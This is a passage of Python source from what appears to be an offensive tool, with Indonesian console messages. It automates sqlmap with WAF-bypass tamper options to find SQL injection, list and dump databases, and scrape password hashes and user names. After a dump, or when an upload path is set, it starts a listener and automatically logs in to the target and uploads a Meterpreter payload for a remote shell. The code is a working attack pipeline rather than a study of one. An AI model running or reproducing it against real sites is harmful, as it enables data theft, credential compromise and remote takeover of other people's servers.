               if x and len(x.strip()) > 1 and "information_schema" not in x.lower()]
        
        console.print(f"[green]Databases found: {dbs[:3]}[/]")
        
        all_tables = {}
        if not dbs:
            session["detected_tables"] = {}
            return "", False, "", "", None

        for db in dbs[:3]:
            console.print(f"[cyan]Scanning tables in: {db}[/]")
            tbl_cmd = f"{_find_sqlmap()} -u \"{url}\" -D \"{db}\" --tables --batch --random-agent --tamper=space2comment"
            try:
                tbl_out = subprocess.run(tbl_cmd, shell=True, capture_output=True, text=True, timeout=180).stdout
            except subprocess.TimeoutExpired:
                console.print(f"[red]Timeout saat mendeteksi tabel di {db}.[/]")
                continue

            tables = [x.strip() for x in re.findall(r"\|\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\|", tbl_out) 
                     if x and len(x.strip()) > 1 and x not in ["table", "tables"]]
            
            if not tables:
                 tables = [x.strip() for x in re.findall(r"\[\*\]\s+([a-zA-Z0-9_]+)", tbl_out)
                          if x and len(x.strip()) > 1 and "database:" not in x.lower()]

            tables = list(set([t for t in tables if _is_valid_table_name(t)]))

            if tables: 
                all_tables[db] = tables
                console.print(f"  [yellow]└─ Tables: {', '.join(tables)}[/]")
            else:
                all_tables[db] = []
                console.print(f"  [dim]└─ No tables found[/]")
                
        session["detected_tables"] = all_tables
        return "", False, "", "", None

    if mode == "list_tables":
        db = options.get("DB", "")
        if not db:
            console.print("[red]Set DB dulu: set DB nama_db[/]")
            return "", False, "", "", None
        
        console.print(f"[bold green]LIST TABLES IN: {db}[/]")
        tables_cmd = f"{_find_sqlmap()} -u \"{url}\" -D \"{db}\" --tables --batch --random-agent"
        result = subprocess.run(tables_cmd, shell=True, capture_output=True, text=True, timeout=180).stdout
        
        tables = []
        in_tables_section = False
        
        for line in result.splitlines():
            line = line.strip()
            if f"Database: {db}" in line:
                in_tables_section = True
                continue
            if in_tables_section:
                if "|" in line and "table" not in line.lower():
                    parts = [part.strip() for part in line.split("|")]
                    if len(parts) >= 2 and parts[1]:
                        tables.append(parts[1])
        
        if not tables:
            table_matches = re.findall(r'\|\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\|', result)
            tables = [tbl for tbl in table_matches if tbl and len(tbl) > 1]
        
        session["list_tables_output"] = tables
        return "", False, "", "", None

    console.print(f"[yellow]Running SQLMap dengan WAF bypass (timeout: {timeout}s)...[/]")
    try:
        pbar = tqdm(total=100, desc="SQLMap + Meter", bar_format="{l_bar}{bar}| {percentage:3.0f}%", ncols=50)
        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
        output, vuln, param, payload, hashes, users = [], False, "", "", [], {}

        for line in proc.stdout:
            output.append(line)
            line = line.strip()

            if "WAF" in line or "protection mechanism" in line:
                console.print("[yellow]WAF Terdeteksi![/]")

            if "is vulnerable" in line.lower():
                vuln = True
                m = re.search(r"Parameter: ([^\s]+)", line)
                param = m.group(1) if m else "?"
                pbar.update(20)

            if "Payload:" in line:
                payload = line.split("Payload:")[1].strip()
                pbar.update(10)

            m_hash = re.search(r"([a-f0-9]{32,})", line)
            m_user = re.search(r"([a-zA-Z0-9._%+-@]+)", line)
            if m_hash:
                h = m_hash.group(1)
                if h not in hashes:
                    hashes.append(h)
                    users[h] = m_user.group(1) if m_user else "admin"

            pbar.update(0.2)

        proc.wait()
        pbar.update(100 - pbar.n)
        pbar.close()

        result = "".join(output)

        if vuln:
            marked = f"[VULN] {url}"
            session.setdefault("vulnerable_urls", []).append(marked)
            console.print(f"[bold red]URL MARKED: {marked}[/]")

        meter_url = None
        if (hashes and "dump" in options["MODE"].lower()) or options.get("UPLOAD_PATH"):
            console.print(f"[bold yellow]Starting upload via UPLOAD_PATH...[/]")
            try:
                lport_int = int(lport)
            except (ValueError, TypeError):
                lport_int = 4444  # default fallback
            meter = CustomMeterpreter(lhost, lport_int)
            meter.start()
            base = url.split("?")[0].rstrip("/")
            meter_url = _auto_login_upload_meter(base, {}, lhost, str(lport_int), options)

        session["dump_output"] = result if "dump" in mode else ""
        return result, vuln, param, payload, meter_url
    except subprocess.TimeoutExpired:
        console.print(f"[red]Timeout setelah {timeout} detik[/]")
        return "", False, "", "", None
    except Exception as e:
        console.print(f"[red]Error in generic mode: {e}[/]")
        return "", False, "", "", None

# ==================== DISPLAY RESULT ====================
def _display_result(output: str, vuln: bool, param: str, payload: str, meter_url: str, session: Dict[str, Any], options: Dict[str, Any]):
    mode = session.get("current_mode", "").lower()

    if mode == "show_vuln":
        vulnerable_urls = session.get("vulnerable_urls", [])
        if vulnerable_urls:
            t = Table(title="[bold magenta]RIWAYAT URL RENTAN (SQLI)[/]", box=box.DOUBLE)
            t.add_column("No.", style="dim")
            t.add_column("URL Rentan", style="bold red")
            unique_urls = list(dict.fromkeys(vulnerable_urls)) 
            for i, url_entry in enumerate(unique_urls, 1):
                clean_url = url_entry.replace("[VULN] ", "")
                t.add_row(str(i), clean_url)
            console.print(Panel(t, border_style="magenta"))
            console.print(f"[bold green]Total: {len(unique_urls)} URL rentan yang tercatat.[/]")
        else:
            console.print(Panel("[bold yellow]BELUM ADA URL RENTAN YANG TERCATAT[/]", title="[bold yellow]INFO[/]", border_style="yellow"))
        return 

    if "detected_dbs" in session and mode == "detect_db":
        if session["detected_dbs"]:
            t = Table(title="[bold cyan]DATABASES DETECTED[/]", box=box.SIMPLE)
            t.add_column("No.", style="dim")
            t.add_column("Database Name", style="bold cyan")
            for i, db in enumerate(session["detected_dbs"], 1):
                t.add_row(str(i), db)
            console.print(Panel(t, border_style="cyan"))
        else:
            console.print(Panel("[bold red]DATABASE TIDAK DITEMUKAN[/]", title="[bold red]INFO[/]", border_style="red"))

    if mode in ["detect_vuln", "detect_vuln_full"]:
        if vuln:
            t = Table(title="[bold red]VULNERABILITY CONFIRMED[/]", box=box.DOUBLE)
            t.add_column("Info", style="bold")
            t.add_column("Details", style="red")
            t.add_row("Status", "VULNERABLE")
            t.add_row("Parameter", param)
            t.add_row("Technique", session.get("tech", "N/A"))
            t.add_row("Next Step", "Use detect_tables or dump modes")
            if session.get("vulnerable_urls"):
                 t.add_row("Marked URL", session["vulnerable_urls"][-1])
            console.print(Panel(t, border_style="red"))
        else:
            console.print(Panel("[bold yellow]TIDAK RENTAN[/]", title="[bold yellow]INFO[/]", border_style="yellow"))

    if "detected_tables" in session and mode == "detect_tables":
        if session["detected_tables"]:
            t = Table(title="[bold yellow]DATABASE → TABLES (AUTO)[/]", box=box.ROUNDED)
            t.add_column("Database", style="bold yellow")
            t.add_column("Tables", style="green") 
            for db, tables in session["detected_tables"].items():
                if tables:
                    tables_str = ", ".join(tables)
                    t.add_row(db, tables_str)
                else:
                    t.add_row(db, "(no tables)")
            console.print(Panel(t, border_style="yellow"))
        else:
            console.print(Panel("[bold red]TIDAK ADA DB/TABLE[/]", title="[bold red]INFO[/]", border_style="red"))

    if "list_tables_output" in session and mode == "list_tables":
        db_name = options.get("DB", "UNKNOWN")
        if session["list_tables_output"]:
            t = Table(title=f"[bold green]TABLES IN: {db_name}[/]", box=box.MINIMAL)
            t.add_column("Table Name", style="green")
            for tbl in session["list_tables_output"]:
                t.add_row(tbl)
            console.print(Panel(t, border_style="green"))
        else:
            console.print(Panel(f"[bold red]TABLE KOSONG DI DB: {db_name}[/]", title="[bold red]INFO[/]", border_style="red"))

    if "dump_output" in session and "dump" in mode:
        lines = session["dump_output"].splitlines()
        if lines:
            t = Table(title="[bold magenta]DUMP PREVIEW (10 baris)[/]", box=box.DOUBLE)
            t.add_column("Row")
            for line in lines[:10]:
                t.add_row(line[:80])
            console.print(Panel(t, border_style="magenta"))
        else:
            console.print(Panel("[bold red]DATA KOSONG[/]", title="[bold red]INFO[/]", border_style="red"))

    if meter_url:
        console.print(f"[bold red]METERPRETER → {meter_url}[/]")
        console.print(f"[bold magenta]meterpreter > help[/]")

# ==================== SHOW MODES ====================
def _show_modes():
    t = Table(title="SQLMap Modes", box=box.SIMPLE)
    t.add_column("Mode", style="bold yellow"); t.add_column("Description")
    for k, v in SQLMAP_MODES.items():
        t.add_row(k, v["desc"])
    console.print(Panel(t, border_style="blue"))

# ==================== MAIN ====================
def run(session: Dict[str, Any], options: Dict[str, Any]):
    console.print("[bold red][*] SQLMap + Meterpreter Starting...[/]")

    try:
        cmd = _build_cmd(options)
        if not cmd:
            return

        if options["MODE"].lower() != "show_vuln":
            console.print(f"[dim]{cmd}[/]")

        lhost = options.get("LHOST", "0.0.0.0")
        lport = options.get("LPORT", "4444")

        # ✅ FIX: Validasi dan konversi LPORT
        try:
            lport_int = int(lport)
            if not (1 <= lport_int <= 65535):
                raise ValueError("Port must be between 1-65535")
        except (ValueError, TypeError) as e:
            console.print(f"[red]❌ INVALID LPORT: {lport} - {e}[/]")
            console.print(f"[yellow]🔄 Using default port 4444[/]")
            lport_int = 4444

        # ✅ FIX: Dapatkan port yang benar-benar available
        available_port = _get_available_port(lport_int)
        if available_port != lport_int:
            console.print(f"[yellow]🔄 Switching from port {lport_int} to {available_port}[/]")
            lport_int = available_port

        console.print(f"[bold green]🎯 FINAL CONFIG: LHOST={lhost}, LPORT={lport_int}[/]")

        output, vuln, param, payload, meter_url = _run_sqlmap(
            cmd, options["URL"], session, lhost, lport_int, options
        )
        
        if output != "show_vuln_done":
            _display_result(output, vuln, param, payload, meter_url, session, options)

        console.print("[bold green][Success] Done! Check meter_sessions.txt & meterpreter_session.log[/]")

    except Exception as e:
        console.print(f"[red]Error: {e}[/]")
        console.print("[yellow]Test: http://testphp.vulnweb.com/listproducts.php?cat=1[/]")
